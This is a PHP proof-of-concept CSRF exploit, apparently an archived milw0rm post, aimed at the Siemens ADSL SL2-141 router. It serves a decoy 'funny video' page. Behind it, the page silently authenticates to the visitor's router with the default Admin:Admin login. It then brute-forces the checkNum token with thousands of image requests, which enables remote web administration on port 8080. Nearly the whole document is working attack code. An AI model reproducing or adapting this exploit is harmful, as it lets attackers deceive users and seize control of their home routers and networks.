<?php

/*

================================================
|| Siemens ADSL SL2-141 (Router) CSRF Exploit ||
================================================

- Successful attacks will allow remote access to the router over the internet.
- Will Bruteforce the random security number, could possibly be calculated...
- Uses default login, could use a dictionary too.
- PoC only, there are much more effective ways of doing this ;-)

========================================================================
[+] Visit us at http://www.binaryvision.org.il/ for more information [+]
========================================================================

*/

$ip = (getenv(HTTP_X_FORWARDED_FOR))? getenv(HTTP_X_FORWARDED_FOR): getenv(REMOTE_ADDR); 	// local computers can use the remote address to login (!).
echo "<img src='http://Admin:Admin@$ip/'></img>"; 						// Uses the default login to auth (Admin:Admin), could use a dictionary instead.

// Just some stuff to keep the user busy, aka Rickroll
$mystr="<html><head><title>Unbelivable movie</title></head><center><script>function siera() {var bullshit='<center><h1>Possibly the funniest video on the web</h1><object classid=\"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0\" width=\"800\" height=\"600\" id=\"movie\"> <param name=\"movie\" value=\"http://llnw.static.cbslocal.com/Themes/CBS/_resources/swf/vindex.swf\" /> <param name=\"quality\" value=\"high\" /> <param name=\"bgcolor\" value=\"#003366\" /> <embed src=\"http://llnw.static.cbslocal.com/Themes/CBS/_resources/swf/vindex.swf\" quality=\"high\" bgcolor=\"#ffffff\" width=\"800\" height=\"600\" name=\"mymoviename\" align=\"\" type=\"application/x-shockwave-flash\" pluginspage=\"http://www.macromedia.com/go/getflashplayer\"> </embed> </object><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR>';
document.write(bullshit);

// \"Random number\" bruteforce ... too lazy to write js :-)
var buff = '';
for(i=1;i<=11000;i++) { buff+=\"<img src='http://$ip/accessremote.cgi?checkNum=\"+i+\"&remoteservice=pppoe_8_48_1&enblremoteWeb=1&remotewebPort=8080'></img>\"; }
document.write(buff);
}
</script><body onload='siera()'></body>";

echo $mystr; // Throw it all on the html page
?>

# milw0rm.com [2009-01-25]